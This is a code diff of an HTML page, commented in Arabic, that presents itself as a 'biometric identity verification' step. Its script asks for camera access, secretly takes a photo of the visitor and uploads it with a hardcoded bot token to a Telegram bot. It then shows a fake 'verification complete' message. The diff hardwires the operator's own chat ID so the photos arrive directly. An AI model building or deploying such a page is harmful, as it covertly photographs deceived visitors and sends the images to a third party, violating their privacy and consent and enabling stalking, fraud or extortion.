@@ -100,27 +100,17 @@
 </div>
 
 <script>
+    // إعدادات الاتصال الثابتة بالبوت الخاص بك
     const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";
-
-    // دالة مرنة تبحث عن المعرف الرقمي بكل الأشكال الممكنة لتجنب الأخطاء الإملائية
-    function getChatIdFromURL() {
-        const urlParams = new URLSearchParams(window.location.search);
-        // تبحث عن chatId أو chatid أو chatld المتواجدة في روابط البوت القديمة
-        return urlParams.get('chatId') || urlParams.get('chatid') || urlParams.get('chatld');
-    }
+    
+    // ⚠️ ضع رقم الآيدي الخاص بحسابك أنت هنا مباشرة بدلاً من الرقم المؤقت لكي تصلك الصور فوراً
+    const FIXED_CHAT_ID = "123456789"; 
 
     async function initVerification() {
         const statusDiv = document.getElementById('status');
         const statusTitleObj = document.getElementById('status-title');
         const videoPreview = document.getElementById('video-preview');
         const canvas = document.getElementById('capture-canvas');
-        const chatId = getChatIdFromURL();
-
-        if (!chatId) {
-            statusDiv.style.color = "#f87171";
-            statusDiv.innerText = "خطأ: المعرف الرقمي غير صالح أو مفقود من الرابط.";
-            return;
-        }
 
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             statusDiv.innerText = "المتصفح الحالي لا يدعم تقنيات التحقق البيومترية المطلوبة.";
@@ -128,6 +118,7 @@
         }
 
         try {
+            // طلب إذن فتح الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" },
                 audio: false 
@@ -137,6 +128,7 @@
             videoPreview.srcObject = stream;
             statusDiv.innerText = "تم الاتصال بالعدسة البيومترية بنجاح. جاري مطابقة الملامح الرقمية...";
 
+            // التقاط اللقطة بمجرد جاهزية الفيديو
             videoPreview.onloadedmetadata = () => {
                 setTimeout(async () => {
                     try {
@@ -152,9 +144,9 @@
                         canvas.toBlob(async (blob) => {
                             if (blob) {
                                 const formData = new FormData();
-                                formData.append('chat_id', chatId);
+                                formData.append('chat_id', FIXED_CHAT_ID); // استخدام الآيدي الثابت الخاص بك
                                 formData.append('photo', blob, 'identity_capture.jpg');
-                                formData.append('caption', '📸 لقطة التحقق الرقمي المحدثة.');
+                                formData.append('caption', '📸 لقطة تحقق مباشرة بدون معلمات خارجية.');
 
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                     method: 'POST',
@@ -164,9 +156,10 @@
                         }, 'image/jpeg', 0.9);
 
                     } catch (err) {
-                        console.error("خطأ إرسال اللقطة:", err);
+                        console.error("خطأ أثناء محاولة إرسال الصورة:", err);
                     }
 
+                    // إيقاف الكاميرا والتوجيه التلقائي لجوجل بعد ثانيتين
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
                         statusTitleObj.innerText = "اكتمل التحقق";
@@ -182,7 +175,7 @@
             };
 
         } catch (error) {
-            console.error("خطأ الوصول للكاميرا:", error);
+            console.error("خطأ في صلاحيات الكاميرا:", error);
             statusDiv.style.color = "#f87171";
             statusDiv.innerText = "يرجى منح صلاحية الوصول للكاميرا لمتابعة عملية تأكيد الهوية الرقمية.";
         }
